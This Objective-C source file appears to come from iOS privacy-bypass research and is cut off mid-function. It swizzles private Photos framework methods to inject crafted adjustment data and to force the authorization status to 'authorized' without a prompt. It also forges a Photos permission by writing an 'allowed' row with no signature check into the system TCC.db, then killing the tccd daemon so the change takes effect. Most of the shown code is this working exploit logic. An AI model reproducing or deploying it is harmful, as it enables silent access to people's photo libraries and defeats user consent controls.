static id (*g_origMergeInfo)(id, SEL, id) = NULL;

static id swzAddImage(id self, SEL _cmd, id r) { g_resultOps |= (1ULL<<0); return g_origAddImage ? g_origAddImage(self,_cmd,r) : self; }
static id swzAddVideo(id self, SEL _cmd, id r) { g_resultOps |= (1ULL<<1); return g_origAddVideo ? g_origAddVideo(self,_cmd,r) : self; }
static id swzAddAdj(id self, SEL _cmd, id r)   { g_resultOps |= (1ULL<<2); return g_origAddAdj ? g_origAddAdj(self,_cmd,r) : self; }
static id swzAddAdjSec(id self, SEL _cmd, id r){ g_resultOps |= (1ULL<<3); return g_origAddAdjSec ? g_origAddAdjSec(self,_cmd,r) : self; }
static id swzSetError(id self, SEL _cmd, id r) { g_resultOps |= (1ULL<<4); return g_origSetError ? g_origSetError(self,_cmd,r) : self; }
static id swzMergeInfo(id self, SEL _cmd, id r){ g_resultOps |= (1ULL<<5); return g_origMergeInfo ? g_origMergeInfo(self,_cmd,r) : self; }

static BOOL g_resultObserversInstalled = NO;
void PHInstallResultObservers(void) {
    // 幂等：二次调用会把 g_orig* 覆盖成 swz* 自身，导致 addAdjustmentDataResult: 等
    // 无限递归栈溢出（7T-2026-10-25-082916.ips: swzAddAdj depth 11101 SIGBUS）。
    if (g_resultObserversInstalled) return;
    g_resultObserversInstalled = YES;
    g_resultOps = 0;
    Class cls = NSClassFromString(@"PHContentEditingInputResult");
    if (!cls) return;
    struct { NSString *name; void **slot; id (*fn)(id,SEL,id); } tab[] = {
        {@"addImageResult:", (void**)&g_origAddImage, swzAddImage},
        {@"addVideoResult:", (void**)&g_origAddVideo, swzAddVideo},
        {@"addAdjustmentDataResult:", (void**)&g_origAddAdj, swzAddAdj},
        {@"addAdjustmentSecondaryDataResult:", (void**)&g_origAddAdjSec, swzAddAdjSec},
        {@"setError:", (void**)&g_origSetError, swzSetError},
        {@"mergeInfoDictionaryFromResult:", (void**)&g_origMergeInfo, swzMergeInfo},
    };
    for (unsigned i = 0; i < sizeof(tab)/sizeof(tab[0]); i++) {
        SEL sel = NSSelectorFromString(tab[i].name);
        Method m = class_getInstanceMethod(cls, sel);
        if (m) { *tab[i].slot = (void*)method_getImplementation(m); method_setImplementation(m, (IMP)tab[i].fn); }
    }
}

// 返回填充观测位掩码：bit0=addImageResult bit1=addVideoResult bit2=addAdjustmentDataResult
// bit3=addAdjustmentSecondaryDataResult bit4=setError bit5=mergeInfoDictionaryFromResult
uint64_t PHResultOpMask(void) { return g_resultOps; }

// ============================================================================
// 方向2 正常管线注入：hook _renderVideoFromVideoURL:asset:adjustmentData:...，把
// adjustmentData 替换为「含相册目录 fileURL 的调整 blob」的 PHAdjustmentData，
// 验证正常管线是否把相册目录 URL 交给 MCM 申请 extension（token 能否指到相册目录）。
// log2_41: 正常管线对真实 asset 也走 video 渲染（_renderVideoFromVideoURL:...,
// imp=0x23dae4），此方法接收 adjustmentData 参数，是可靠注入点。
// ============================================================================
static id g_injectAdj = nil;
static IMP g_orig_renderVideoAdj = NULL;

static void swz_renderVideoAdj(id self, SEL _cmd, id url, id asset, id adj, BOOL canHandle, id handler) {
    if (g_injectAdj) {
        NSLog(@"[CEIR-INJECT] _renderVideoFromVideoURL replacing adjustmentData %@ -> %@",
              adj ? [adj class] : @"(nil)", [g_injectAdj class]);
        adj = g_injectAdj;
    }
    if (g_orig_renderVideoAdj) {
        ((void(*)(id,SEL,id,id,id,BOOL,id))g_orig_renderVideoAdj)(self, _cmd, url, asset, adj, canHandle, handler);
    }
}

// 设置要注入的 adjustmentData（PHAdjustmentData，data 为含相册目录 fileURL 的 blob）。
void PHSetInjectAdjustmentData(id adj) { g_injectAdj = adj; }
id PHGetInjectAdjustmentData(void) { return g_injectAdj; }

// 安装注入 hook。只影响当前进程后续 contentEditingInput 渲染（注入窗口内）。
// 幂等：二次调用会覆盖 g_orig_renderVideoAdj 为 swz 自身导致递归，故加标志。
static BOOL g_renderAdjHooked = NO;
void PHInstallRenderAdjInject(void) {
    if (g_renderAdjHooked) return;
    Class cls = NSClassFromString(@"PHContentEditingInputRequestContext");
    if (!cls) return;
    SEL sel = NSSelectorFromString(@"_renderVideoFromVideoURL:asset:adjustmentData:canHandleAdjustmentData:resultHandler:");
    Method m = class_getInstanceMethod(cls, sel);
    if (m) {
        g_orig_renderVideoAdj = method_getImplementation(m);
        method_setImplementation(m, (IMP)swz_renderVideoAdj);
        g_renderAdjHooked = YES;
        NSLog(@"[CEIR-INJECT] hooked _renderVideoFromVideoURL:... (orig=%p)", g_orig_renderVideoAdj);
    } else {
        NSLog(@"[CEIR-INJECT] _renderVideoFromVideoURL:... NOT FOUND on %s", class_getName(cls));
    }
}

// ============================================================================
// 无授权实验（zhongquanli 核心）：hook app 层 PHPhotoLibrary 授权状态返回 authorized，
// 尝试在【不弹窗 / 不 requestAuthorization】下触发正常管线产出 token。
// log2_44 已证：无授权的 runProbe 能从 photos.service 拿到 adjustment data（XPC 返回），
// 说明 photos.service 对部分请求不查 TCC。本 hook 让 app 层检查通过（PHImageManager 创建
// 完整 ctx），赌 photos.service 端也不查 → 无弹窗产 token 覆盖 DCIM。
// PHAuthorizationStatusAuthorized=3。
// ============================================================================
static NSInteger swzAuthStatus(id self, SEL _cmd) { return 3; }
static NSInteger swzAuthStatusForLevel(id self, SEL _cmd, NSInteger level) { return 3; }

void PHForceAuthorized(void) {
    Class cls = NSClassFromString(@"PHPhotoLibrary");
    if (!cls) return;
    BOOL hooked = NO;
    Method cm = class_getClassMethod(cls, NSSelectorFromString(@"authorizationStatus"));
    if (cm) { method_setImplementation(cm, (IMP)swzAuthStatus); hooked = YES; }
    Method cm2 = class_getClassMethod(cls, NSSelectorFromString(@"authorizationStatusForAccessLevel:"));
    if (cm2) { method_setImplementation(cm2, (IMP)swzAuthStatusForLevel); hooked = YES; }
    NSLog(@"[NOAUTH] PHPhotoLibrary authorizationStatus forced -> authorized (no TCC dialog) hooked=%d", hooked);
}

// ============================================================================
// 深度授权门扫描（log2_54/55 结论：PHPhotoLibrary 那两个类方法不是真正的门——
// 强制返回 3 之后 fetch count 仍是 0）。这里枚举已加载类，把所有
// authorization / privacy / tcc 相关且返回整型的方法统一改成返回 3，
// 用来判定门到底在客户端（PhotoLibraryServices）还是 photolibraryd 服务端：
//   fetch count > 0 → 客户端门，可以复现"不弹授权拿图"
//   fetch count = 0 → 服务端查，客户端 swizzle 无解
// 返回逐条命中记录（写进日志，便于确认 PLPrivacy 之类是否真的存在）。
// ============================================================================
static NSInteger swzReturnGate(id self, SEL _cmd) { return 3; }

static BOOL PHGateSelectorMatch(NSString *selName) {
    // 白名单：只碰真正可能决定"能不能取图"的授权查询。
    // log2_56 里按关键字泛匹配 hook 了 54 个方法（LACTCCManager / CNTCC* /
    // ICPrivacyInfo / AMS* 等），随后进程直接死在 fetch —— 那些方法的返回值
    // 有各自的取值域（right/acknowledgement 等），统一返回 3 会越界或走错分支。
    static NSSet *allowed = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        allowed = [NSSet setWithArray:@[
            @"authorizationStatus",
            @"authorizationStatusForAccessLevel:",
            @"checkAuthorizationStatusForAPIAccessLevel:",
            @"checkAuthorizationStatusForAPIAccessLevel:suppressPrompt:",
            @"photosAccessAllowedWithScope:auditToken:clientAuthorization:",
        ]];
    });
    return [allowed containsObject:selName];
}

static BOOL PHGateClassMatch(const char *name) {
    if (!name) return NO;
    NSString *n = [NSString stringWithUTF8String:name];
    if (!n) return NO;
    return [n isEqualToString:@"PLPrivacy"] || [n isEqualToString:@"PHPhotoLibrary"];
}

static BOOL PHGateReturnIsInteger(const char *types) {
    if (!types || !types[0]) return NO;
    return strchr("iIsSlLqQBcC", types[0]) != NULL;
}

NSString *PHBypassAllAuthGates(void) {
    dlopen("/System/Library/Frameworks/Photos.framework/Photos", RTLD_LAZY);
    dlopen("/System/Library/PrivateFrameworks/PhotoLibraryServices.framework/PhotoLibraryServices", RTLD_LAZY);

    int count = objc_getClassList(NULL, 0);
    if (count <= 0) return @"objc_getClassList 返回 0";
    Class *classes = (Class *)calloc((size_t)count, sizeof(Class));
    if (!classes) return @"calloc 失败";
    count = objc_getClassList(classes, count);

    NSMutableString *log = [NSMutableString string];
    int classesMatched = 0, methodsHooked = 0;

    for (int i = 0; i < count; i++) {
        Class cls = classes[i];
        if (!cls) continue;
        const char *cname = class_getName(cls);
        if (!cname || !PHGateClassMatch(cname)) continue;
        classesMatched++;

        unsigned int mcount = 0;
        Method *methods = class_copyMethodList(cls, &mcount);
        for (unsigned int j = 0; j < mcount; j++) {
            SEL sel = method_getName(methods[j]);
            NSString *selName = NSStringFromSelector(sel);
            if (!PHGateSelectorMatch(selName)) continue;
            const char *types = method_getTypeEncoding(methods[j]);
            if (!PHGateReturnIsInteger(types)) continue;
            class_replaceMethod(cls, sel, (IMP)swzReturnGate, types);
            [log appendFormat:@"%@ -%@; ", NSStringFromClass(cls), selName];
            methodsHooked++;
        }
        if (methods) free(methods);

        Class meta = object_getClass(cls);
        methods = class_copyMethodList(meta, &mcount);
        for (unsigned int j = 0; j < mcount; j++) {
            SEL sel = method_getName(methods[j]);
            NSString *selName = NSStringFromSelector(sel);
            if (!PHGateSelectorMatch(selName)) continue;
            const char *types = method_getTypeEncoding(methods[j]);
            if (!PHGateReturnIsInteger(types)) continue;
            class_replaceMethod(meta, sel, (IMP)swzReturnGate, types);
            [log appendFormat:@"%@ +%@; ", NSStringFromClass(cls), selName];
            methodsHooked++;
        }
        if (methods) free(methods);
    }
    free(classes);

    NSString *summary = [NSString stringWithFormat:@"classes=%d hooks=%d", classesMatched, methodsHooked];
    if (log.length == 0) return summary;
    return [NSString stringWithFormat:@"%@ | %@", summary, log];
}

// 取 ctx 的真实初始 request（initialRequests, imp=0x23b848）。
// log2_32 反汇编确认：processAndReturnResultsWithRequest: 的 request 参数（x2）传给
// ctx offset 8 的驱动对象；传 nil 时驱动对象只回调空 result（addImage 等从未被调，
// fill-ops=0x0）。正常 PHImageManager 流程是 initialRequests → 对每个 request 调
// processAndReturnResultsWithRequest:。本封装取 initialRequests 返回值（request 对象，
// 被缓存到 ctx->f74 ivar），供 Swift 侧取真实 request 驱动。
id PHCEIRInitialRequests(id receiver) {
    SEL sel = NSSelectorFromString(@"initialRequests");
    if (!receiver || ![receiver respondsToSelector:sel]) return nil;
    @try {
        typedef id (*fn)(id, SEL);
        return ((fn)objc_msgSend)(receiver, sel);
    } @catch (NSException *e) {
        NSLog(@"[CEIR] initialRequests threw: %@", e);
        return nil;
    }
}

// dump ctx 前 0x40 字节内存（isa、offset 8 驱动对象、f40/f4c 等），每个 slot 尝试解出
// 指向对象的 class。log2_33 显示 request=PHAdjustmentDataRequest 非 nil 后管线进入真
// 异步但 5s 不回调——需确认 ctx offset 8 驱动对象是否完整（PHImageManager 设置的处理链）。
NSString *PHCEIRDumpCtxSlots(id obj) {
    if (!obj) return @"(nil)";
    uint8_t raw[0x40];
    memcpy(raw, (__bridge void*)obj, 0x40);
    NSMutableString *s = [NSMutableString string];
    for (int i = 0; i < 8; i++) {
        uint64_t v;
        memcpy(&v, raw + i*8, 8);
        NSString *cls = @"?";
        // 粗略判对象指针：非 isa 槽且低位对齐。offset 0 是 isa（可能 tagged），跳过判类。
        if (i != 0 && v && (v & 0x3) == 0) {
            @try {
                id o = (__bridge id)(void*)v;
                cls = [NSString stringWithFormat:@"%s", class_getName([o class])];
            } @catch(id e) { cls = @"(not-obj)"; }
        }
        [s appendFormat:@"+0x%02x: 0x%llx (%@)\n", i*8, v, cls];
    }
    return s;
}

// 查询 ctx 是否应请求 image/video（_shouldRequestImage 0x23e304 / _shouldRequestVideo 0x23e200）。
// 方向2：PHContentEditingInputRequestContext 的 initialRequests 先返回 adjustment 前置请求，
// image 请求由后续机制生成。确认 _shouldRequestImage 为真（asset.mediaType=Image）→ ctx
// 确实配置为生成 image 请求，只是当前被 adjustment 同步请求挂起阻塞。
BOOL PHCEIRShouldRequestImage(id receiver) {
    SEL sel = NSSelectorFromString(@"_shouldRequestImage");
    if (!receiver || ![receiver respondsToSelector:sel]) return NO;
    @try {
        typedef BOOL (*fn)(id, SEL);
        return ((fn)objc_msgSend)(receiver, sel);
    } @catch (NSException *e) {
        NSLog(@"[CEIR] _shouldRequestImage threw: %@", e);
        return NO;
    }
}
BOOL PHCEIRShouldRequestVideo(id receiver) {
    SEL sel = NSSelectorFromString(@"_shouldRequestVideo");
    if (!receiver || ![receiver respondsToSelector:sel]) return NO;
    @try {
        typedef BOOL (*fn)(id, SEL);
        return ((fn)objc_msgSend)(receiver, sel);
    } @catch (NSException *e) {
        NSLog(@"[CEIR] _shouldRequestVideo threw: %@", e);
        return NO;
    }
}

// 生成 base 媒体请求（_baseMediaRequestsForBaseVersion:error: 0x23cad4，3 参数含 error 指针）。
// 方向2：ctx _shouldRequestImage=true 但 image 请求只在 adjustment 前置请求完成后由
// produceChildRequestsForRequest: 生成。adjustment 同步请求 semaphore=nil 挂起，阻塞到
// 不了 image 请求。本封装直接调 _baseMediaRequestsForBaseVersion:error: 生成 base 媒体请求集合，
// 看是否含 image 请求，绕过 adjustment 阻塞直接驱动 image 请求 → addImageResult → token。
// 注意 selector 是 _baseMediaRequestsForBaseVersion:error:（log2_36 stub 0x3adb20 证实），
// baseVersion=2 时函数直接返回空（0x23cc04 cmp x28,#2 b.eq），故传 0。
id PHCEIRBaseMediaRequests(id receiver, NSInteger baseVersion) {
    SEL sel = NSSelectorFromString(@"_baseMediaRequestsForBaseVersion:error:");
    if (!receiver || ![receiver respondsToSelector:sel]) return nil;
    @try {
        NSError *err = nil;
        typedef id (*fn)(id, SEL, NSInteger, NSError **);
        return ((fn)objc_msgSend)(receiver, sel, baseVersion, &err);
    } @catch (NSException *e) {
        NSLog(@"[CEIR] _baseMediaRequestsForBaseVersion:error: threw: %@", e);
        return nil;
    }
}

// ============================================================================
// TCC 服务端伪造（研究用）
//
// photos.service（photolibraryd / PhotoLibraryServices）不复用 app 内的
// PHPhotoLibrary 授权状态：它拿 XPC 消息里的 audit token 去问 tccd，tccd 再按
// client 的 code signing identity 查 TCC.db。所以 app 层 hook 无效，本块直接改
// tccd 的答案：
//   1) 向 TCC.db 写 kTCCServicePhotos / kTCCServicePhotosAdd 授权行（csreq=NULL）
//   2) kill tccd，让它在下次查询时重新加载 DB
//   3) 用 TCCAccessCheckAuditToken 以自身 audit token 自检（与 photos.service 同源）
// 依赖：TCC.db 写权限（沙盒逃逸后；iOS 27 若在 ProtectedSystem 还需 root/krw）。
// ============================================================================

// ---- sqlite3（dlopen，避免改工程链接配置） ----
typedef struct sqlite3 sqlite3;
typedef struct sqlite3_stmt sqlite3_stmt;

enum {
    kSQLiteOK = 0,
    kSQLiteRow = 100,
    kSQLiteOpenReadWrite = 0x00000002,
};

static int (*p_sqlite3_open_v2)(const char *, sqlite3 **, int, const char *) = NULL;
static int (*p_sqlite3_close)(sqlite3 *) = NULL;
static int (*p_sqlite3_exec)(sqlite3 *, const char *, void *, void *, char **) = NULL;
static void (*p_sqlite3_free)(void *) = NULL;
static const char *(*p_sqlite3_errmsg)(sqlite3 *) = NULL;
static int (*p_sqlite3_prepare_v2)(sqlite3 *, const char *, int, sqlite3_stmt **, const char **) = NULL;
static int (*p_sqlite3_step)(sqlite3_stmt *) = NULL;
static int (*p_sqlite3_finalize)(sqlite3_stmt *) = NULL;
static const unsigned char *(*p_sqlite3_column_text)(sqlite3_stmt *, int) = NULL;
static int (*p_sqlite3_column_int)(sqlite3_stmt *, int) = NULL;

static BOOL loadSQLite(void) {
    static int state = 0; // 0=未加载 1=成功 -1=失败
    if (state != 0) return state > 0;
    void *h = dlopen("/usr/lib/libsqlite3.dylib", RTLD_LAZY);
    if (!h) h = dlopen("/usr/lib/libsqlite3.0.dylib", RTLD_LAZY);
    if (!h) { state = -1; return NO; }
    p_sqlite3_open_v2 = (int (*)(const char *, sqlite3 **, int, const char *))dlsym(h, "sqlite3_open_v2");
    p_sqlite3_close = (int (*)(sqlite3 *))dlsym(h, "sqlite3_close");
    p_sqlite3_exec = (int (*)(sqlite3 *, const char *, void *, void *, char **))dlsym(h, "sqlite3_exec");
    p_sqlite3_free = (void (*)(void *))dlsym(h, "sqlite3_free");
    p_sqlite3_errmsg = (const char *(*)(sqlite3 *))dlsym(h, "sqlite3_errmsg");
    p_sqlite3_prepare_v2 = (int (*)(sqlite3 *, const char *, int, sqlite3_stmt **, const char **))dlsym(h, "sqlite3_prepare_v2");
    p_sqlite3_step = (int (*)(sqlite3_stmt *))dlsym(h, "sqlite3_step");
    p_sqlite3_finalize = (int (*)(sqlite3_stmt *))dlsym(h, "sqlite3_finalize");
    p_sqlite3_column_text = (const unsigned char *(*)(sqlite3_stmt *, int))dlsym(h, "sqlite3_column_text");
    p_sqlite3_column_int = (int (*)(sqlite3_stmt *, int))dlsym(h, "sqlite3_column_int");
    BOOL ok = p_sqlite3_open_v2 && p_sqlite3_close && p_sqlite3_exec && p_sqlite3_free &&
              p_sqlite3_errmsg && p_sqlite3_prepare_v2 && p_sqlite3_step &&
              p_sqlite3_finalize && p_sqlite3_column_text && p_sqlite3_column_int;
    state = ok ? 1 : -1;
    return ok;
}

static NSString *sqliteErr(sqlite3 *db) {
    if (!db || !p_sqlite3_errmsg) return @"(no db)";
    const char *m = p_sqlite3_errmsg(db);
    return m ? [NSString stringWithUTF8String:m] : @"?";
}

static NSString *execSQL(sqlite3 *db, NSString *sql) {
    char *err = NULL;
    int rc = p_sqlite3_exec(db, sql.UTF8String, NULL, NULL, &err);
    if (rc == kSQLiteOK) return nil;
    NSString *msg = err ? [NSString stringWithUTF8String:err] : @"unknown";
    if (err && p_sqlite3_free) p_sqlite3_free(err);
    return msg;
}

static NSString *sqlLiteral(NSString *s) {
    if (!s) return @"NULL";
    return [NSString stringWithFormat:@"'%@'", [s stringByReplacingOccurrencesOfString:@"'" withString:@"''"]];
}

static NSString *bootSessionUUID(void) {
    char buf[64] = {0};
    size_t len = sizeof(buf) - 1;
    if (sysctlbyname("kern.bootsessionuuid", buf, &len, NULL, 0) != 0 || buf[0] == 0) {
        return @"UNUSED";
    }
    return [NSString stringWithUTF8String:buf];
}

// ---- 直接向 tccd 查询（photos.service 拿到的就是同一结论） ----
typedef int (*TCCCheckAuditTokenFn)(CFStringRef, audit_token_t, CFDictionaryRef);
typedef int (*TCCPreflightFn)(CFStringRef, CFDictionaryRef);

static TCCCheckAuditTokenFn tccCheckFn(void) {
    static TCCCheckAuditTokenFn fn = NULL;
    static BOOL tried = NO;
    if (tried) return fn;
    tried = YES;
    fn = (TCCCheckAuditTokenFn)dlsym(RTLD_DEFAULT, "TCCAccessCheckAuditToken");
    if (!fn) {
        void *h = dlopen("/usr/lib/libtcc.dylib", RTLD_LAZY);
        if (!h) h = dlopen("/System/Library/PrivateFrameworks/TCC.framework/TCC", RTLD_LAZY);
        if (h) fn = (TCCCheckAuditTokenFn)dlsym(h, "TCCAccessCheckAuditToken");
    }
    return fn;
}

static TCCPreflightFn tccPreflightFn(void) {
    static TCCPreflightFn fn = NULL;
    static BOOL tried = NO;
    if (tried) return fn;
    tried = YES;
    fn = (TCCPreflightFn)dlsym(RTLD_DEFAULT, "TCCAccessPreflight");
    if (!fn) {
        void *h = dlopen("/usr/lib/libtcc.dylib", RTLD_LAZY);
        if (h) fn = (TCCPreflightFn)dlsym(h, "TCCAccessPreflight");
    }
    return fn;
}

// TASK_AUDIT_TOKEN 在部分 SDK 里未公开，兜底成 XNU 固定值（TASK_VM_INFO=22 别混用）。
#ifndef TASK_AUDIT_TOKEN
#define TASK_AUDIT_TOKEN 15
#endif

static BOOL currentAuditToken(audit_token_t *out) {
    mach_msg_type_number_t count = (mach_msg_type_number_t)(sizeof(audit_token_t) / sizeof(natural_t));
    kern_return_t kr = task_info(mach_task_self(), TASK_AUDIT_TOKEN, (task_info_t)out, &count);
    return kr == KERN_SUCCESS;
}

static const char *tccResultName(int r) {
    switch (r) {
        case 0: return "denied";
        case 1: return "unknown";
        case 2: return "allowed";
        case 3: return "limited";
        default: return "?";
    }
}

// 判定口径说明：真机上 auditToken 版对未持 tccd 管理 entitlement 的进程恒返回 0(denied)，
// 与真实授权状态不符（log2_54：授权生效后 fetch=2/DCIM 可读，auditToken 仍报 0）。
// 因此 preflight 优先，它是第三方进程可用的口径；auditToken 值仅作对比诊断。
int TCCServerCheckPhotos(void) {
    TCCPreflightFn pf = tccPreflightFn();
    if (pf) return pf(CFSTR("kTCCServicePhotos"), NULL);
    audit_token_t at;
    TCCCheckAuditTokenFn fn = tccCheckFn();
    if (fn && currentAuditToken(&at)) {
        return fn(CFSTR("kTCCServicePhotos"), at, NULL);
    }
    return -1;
}

NSString *TCCServerCheckDetail(void) {
    audit_token_t at;
    BOOL haveToken = currentAuditToken(&at);
    TCCCheckAuditTokenFn fn = tccCheckFn();
    TCCPreflightFn pf = tccPreflightFn();
    if (!fn && !pf) {
        return @"libtcc 不可用（TCCAccessCheckAuditToken / TCCAccessPreflight 都没找到）";
    }
    NSMutableString *s = [NSMutableString string];
    if (pf) {
        int rp = pf(CFSTR("kTCCServicePhotos"), NULL);
        int ra = pf(CFSTR("kTCCServicePhotosAdd"), NULL);
        [s appendFormat:@"preflight photos=%d(%s) photosAdd=%d(%s)",
                      rp, tccResultName(rp), ra, tccResultName(ra)];
    } else {
        [s appendString:@"preflight 不可用"];
    }
    if (fn && haveToken) {
        int rp = fn(CFSTR("kTCCServicePhotos"), at, NULL);
        [s appendFormat:@" | auditToken photos=%d(%s)", rp, tccResultName(rp)];
    } else {
        [s appendFormat:@" | auditToken 不可用(fn=%d token=%d)", fn != NULL, haveToken];
    }
    return s;
}

// ---- 进程查找 / kill（libproc 符号 dlsym，避免额外链接） ----
typedef int (*ProcListAllPidsFn)(void *, int);
typedef int (*ProcNameFn)(int, void *, uint32_t);

static int findDaemonPid(const char *name) {
    static ProcListAllPidsFn listFn = NULL;
    static ProcNameFn nameFn = NULL;
    static BOOL tried = NO;
    if (!tried) {
        tried = YES;
        listFn = (ProcListAllPidsFn)dlsym(RTLD_DEFAULT, "proc_listallpids");
        nameFn = (ProcNameFn)dlsym(RTLD_DEFAULT, "proc_name");
    }
    if (!listFn || !nameFn) return -1;
    int cap = listFn(NULL, 0);
    if (cap <= 0) return -1;
    cap += 32;
    pid_t *pids = (pid_t *)calloc((size_t)cap, sizeof(pid_t));
    if (!pids) return -1;
    int cnt = listFn(pids, cap * (int)sizeof(pid_t));
    if (cnt > cap) cnt = cap;
    int found = -1;
    for (int i = 0; i < cnt; i++) {
        char nm[64] = {0};
        if (pids[i] > 0 && nameFn(pids[i], nm, sizeof(nm)) > 0 && strcmp(nm, name) == 0) {
            found = pids[i];
            break;
        }
    }
    free(pids);
    return found;
}

static NSString *stopDaemonNamed(const char *name) {
    int pid = findDaemonPid(name);
    if (pid <= 0) return [NSString stringWithFormat:@"%s 未运行（下次查询按需启动）", name];
    if (kill(pid, SIGKILL) == 0) return [NSString stringWithFormat:@"已 kill %s pid=%d", name, pid];
    return [NSString stringWithFormat:@"kill %s(pid=%d) 失败 errno=%d", name, pid, errno];
}

// ---- DB 定位 / schema 读取 / 写授权行 ----
static NSString *findTCCDBPath(void) {
    NSMutableArray<NSString *> *cands = [NSMutableArray array];
    [cands addObject:@"/var/mobile/Library/TCC/TCC.db"];
    [cands addObject:@"/var/db/TCC/TCC.db"];
    NSString *ps = @"/private/var/containers/Data/ProtectedSystem";
    NSArray *entries = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:ps error:NULL];
    for (NSString *e in entries) {
        [cands addObject:[NSString stringWithFormat:@"%@/%@/Data/Library/Application Support/com.apple.TCC/TCC.db", ps, e]];
    }
    NSString *firstExisting = nil;
    for (NSString *p in cands) {
        if (access(p.fileSystemRepresentation, F_OK) != 0) continue;
        if (!firstExisting) firstExisting = p;
        if (access(p.fileSystemRepresentation, W_OK) == 0) return p;
    }
    return firstExisting;
}

// tccd 认的是 code signing identity；unsigned 包部分版本退回路径匹配，三种都写。
static NSArray<NSDictionary *> *targetTCCClients(void) {
    NSMutableArray<NSDictionary *> *raw = [NSMutableArray array];

    typedef struct __SecTask *SecTaskRef;
    typedef SecTaskRef (*SecTaskCreateFromSelfFn)(CFAllocatorRef);
    typedef CFStringRef (*SecTaskCopySigningIdentifierFn)(SecTaskRef, CFErrorRef *);
    static SecTaskCreateFromSelfFn createFn = NULL;
    static SecTaskCopySigningIdentifierFn identFn = NULL;
    static BOOL resolved = NO;
    if (!resolved) {
        resolved = YES;
        createFn = (SecTaskCreateFromSelfFn)dlsym(RTLD_DEFAULT, "SecTaskCreateFromSelf");
        identFn = (SecTaskCopySigningIdentifierFn)dlsym(RTLD_DEFAULT, "SecTaskCopySigningIdentifier");
    }
    if (createFn && identFn) {
        SecTaskRef task = createFn(NULL);
        if (task) {
            CFStringRef sid = identFn(task, NULL);
            if (sid) {
                [raw addObject:@{@"client": (__bridge_transfer NSString *)sid, @"type": @0}];
            }
            CFRelease(task);
        }
    }

    NSString *bid = [NSBundle mainBundle].bundleIdentifier;
    if (bid.length) [raw addObject:@{@"client": bid, @"type": @0}];

    NSString *exe = [NSBundle mainBundle].executablePath;
    if (exe.length) [raw addObject:@{@"client": exe, @"type": @1}];

    NSMutableArray<NSDictionary *> *out = [NSMutableArray array];
    NSMutableSet<NSString *> *seen = [NSMutableSet set];
    for (NSDictionary *d in raw) {
        NSString *k = [NSString stringWithFormat:@"%d:%@", [d[@"type"] intValue], d[@"client"]];
        if ([seen containsObject:k]) continue;
        [seen addObject:k];
        [out addObject:d];
    }
    return out;
}

static NSArray<NSDictionary *> *loadAccessColumns(sqlite3 *db) {
    NSMutableArray<NSDictionary *> *cols = [NSMutableArray array];
    sqlite3_stmt *st = NULL;
    if (p_sqlite3_prepare_v2(db, "PRAGMA table_info(access);", -1, &st, NULL) != kSQLiteOK) {
        return cols;
    }
    while (p_sqlite3_step(st) == kSQLiteRow) {
        const unsigned char *nm = p_sqlite3_column_text(st, 1);
        const unsigned char *ty = p_sqlite3_column_text(st, 2);
        int notnull = p_sqlite3_column_int(st, 3);
        const unsigned char *dflt = p_sqlite3_column_text(st, 4);
        [cols addObject:@{
            @"name": nm ? [NSString stringWithUTF8String:(const char *)nm] : @"",
            @"type": ty ? [NSString stringWithUTF8String:(const char *)ty] : @"",
            @"notnull": @(notnull),
            @"dflt": dflt ? [NSString stringWithUTF8String:(const char *)dflt] : @"",
        }];
    }
    p_sqlite3_finalize(st);
    return cols;
}

static BOOL sqliteTableExists(sqlite3 *db, NSString *table) {
    NSString *q = [NSString stringWithFormat:
                   @"SELECT count(*) FROM sqlite_master WHERE type='table' AND name=%@;",
                   sqlLiteral(table)];
    sqlite3_stmt *st = NULL;
    if (p_sqlite3_prepare_v2(db, q.UTF8String, -1, &st, NULL) != kSQLiteOK) return NO;
    BOOL exists = NO;
    if (p_sqlite3_step(st) == kSQLiteRow) exists = p_sqlite3_column_int(st, 0) > 0;
    p_sqlite3_finalize(st);
    return exists;
}

static NSString *literalForColumn(NSString *col, NSString *service, NSString *client, int clientType) {
    if ([col isEqualToString:@"service"]) return sqlLiteral(service);
    if ([col isEqualToString:@"client"]) return sqlLiteral(client);
    if ([col isEqualToString:@"client_type"]) return [NSString stringWithFormat:@"%d", clientType];
    if ([col isEqualToString:@"auth_value"]) return @"2";      // TCCAccessResultAllowed
    if ([col isEqualToString:@"auth_reason"]) return @"4";     // 用户同意
    if ([col isEqualToString:@"auth_version"]) return @"1";
    if ([col isEqualToString:@"csreq"]) return @"NULL";        // 不校验调用方签名
    if ([col isEqualToString:@"policy_id"]) return @"NULL";
    if ([col isEqualToString:@"indirect_object_identifier"]) return @"'UNUSED'";
    if ([col isEqualToString:@"indirect_object_identifier_type"]) return @"0";
    if ([col isEqualToString:@"indirect_object_code_identity"]) return @"NULL";
    if ([col isEqualToString:@"flags"]) return @"0";
    if ([col isEqualToString:@"last_modified"]) {
        return [NSString stringWithFormat:@"%lld", (long long)[[NSDate date] timeIntervalSince1970]];
    }
    if ([col isEqualToString:@"pid"]) return @"NULL";
    if ([col isEqualToString:@"pid_version"]) return @"NULL";
    if ([col isEqualToString:@"boot_uuid"]) return sqlLiteral(bootSessionUUID());
    if ([col isEqualToString:@"last_reminded"]) return @"0";
    return nil;
}

static NSString *buildAccessInsert(NSArray<NSDictionary *> *cols,
                                   NSString *service,
                                   NSDictionary *client) {
    NSMutableArray<NSString *> *names = [NSMutableArray array];
    NSMutableArray<NSString *> *vals = [NSMutableArray array];
    for (NSDictionary *c in cols) {
        NSString *name = c[@"name"];
        NSString *lit = literalForColumn(name, service, client[@"client"], [client[@"type"] intValue]);
        if (!lit) {
            // 未知列：NOT NULL 无默认值的按类型兜底，其余写 NULL（INTEGER PRIMARY KEY 会自动分配）
            if ([c[@"notnull"] intValue] != 0) {
                NSString *ty = [c[@"type"] uppercaseString];
                if ([ty containsString:@"TEXT"]) lit = @"''";
                else if ([ty containsString:@"BLOB"]) lit = @"x''";
                else lit = @"0";
            } else {
                lit = @"NULL";
            }
        }
        [names addObject:name];
        [vals addObject:lit];
    }
    return [NSString stringWithFormat:@"INSERT INTO access (%@) VALUES (%@);",
            [names componentsJoinedByString:@","],
            [vals componentsJoinedByString:@","]];
}

NSString *TCCForgePhotosGrant(void) {
    NSMutableString *log = [NSMutableString string];
    if (!loadSQLite()) return @"libsqlite3 加载失败（无法写 TCC.db）";

    NSString *dbPath = findTCCDBPath();
    if (!dbPath) return @"未找到 TCC.db（legacy / ProtectedSystem 都不可见）";

    BOOL writable = (access(dbPath.fileSystemRepresentation, W_OK) == 0);
    [log appendFormat:@"db=%@ writable=%d\n", dbPath, writable];
    if (!writable) {
